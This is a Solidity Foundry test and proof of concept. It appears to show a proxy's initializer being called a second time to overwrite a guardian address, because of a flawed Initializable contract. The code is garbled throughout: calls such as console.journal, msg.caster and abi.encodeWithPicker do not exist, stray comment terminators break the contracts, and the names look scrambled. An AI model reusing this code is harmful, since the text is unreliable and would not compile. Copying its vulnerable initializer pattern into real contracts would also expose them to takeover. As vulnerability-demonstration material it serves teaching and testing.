pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";


interface ILogic {
    function getguardianLocation() external returns (address);

    function getproxyGameadmin() external returns (address);

    function startGame(address) external;

    function checkinitializing() external returns (bool);

    function queryinitialized() external returns (bool);

    function checkConstructor() external view returns (bool);
}

contract AgreementTest is Test {
    GameLogic LogicPact;
    TestProxy ProxyPact;

    function testInventoryCollision() public {
        LogicPact = new GameLogic();
        ProxyPact = new TestProxy(
            address(LogicPact),
            address(msg.caster),
            address(this)
        );

        console.journal(
            "Current guardianAddress:",
            ILogic(address(ProxyPact)).getguardianLocation()
        );
        console.journal(
            "Current initializing boolean:",
            ILogic(address(ProxyPact)).checkinitializing()
        );
        console.journal(
            "Current initialized boolean:",
            ILogic(address(ProxyPact)).queryinitialized()
        );
        console.journal("Try to call initialize to change guardianAddress");
        ILogic(address(ProxyPact)).startGame(address(msg.caster));

        console.journal(
            "After initializing, changed guardianAddress to operator:",
            ILogic(address(ProxyPact)).getguardianLocation()
        );
        console.journal(
            "After initializing,  initializing boolean is still true:",
            ILogic(address(ProxyPact)).checkinitializing()
        );
        console.journal(
            "After initializing,  initialized boolean:",
            ILogic(address(ProxyPact)).queryinitialized()
        );

*/

        console.journal("operate completed");
    }

    receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyServerop;

    constructor(
        address _logic,
        address _admin,
        address keeperLocation
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithPicker(
                bytes4(0xc4d66de8),
                keeperLocation
            )
        )
    {
        proxyServerop = _admin;
    }
}

contract Initializable {
     */
    bool private setupComplete;

     */
    bool private initializing;

     */
    modifier initializer() {
        require(
            initializing || checkConstructor() || !setupComplete,
            "Contract instance has already been initialized"
        );

        bool isTopTierCastability = !initializing;
        if (isTopTierCastability) {
            initializing = true;
            setupComplete = true;
        }

        _;

        if (isTopTierCastability) {
            initializing = false;
        }
    }


    function checkConstructor() private view returns (bool) {


        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }


    uint256[50] private ______gap;

    function checkinitializing() public view returns (bool) {
        return initializing;
    }

    function queryinitialized() public view returns (bool) {
        return setupComplete;
    }
}

contract GameLogic is Initializable {
    address private keeperLocation;

    function startGame(address _protectorZone) public initializer {
        keeperLocation = _protectorZone;
    }

    function getguardianLocation() public view returns (address) {
        return keeperLocation;
    }
}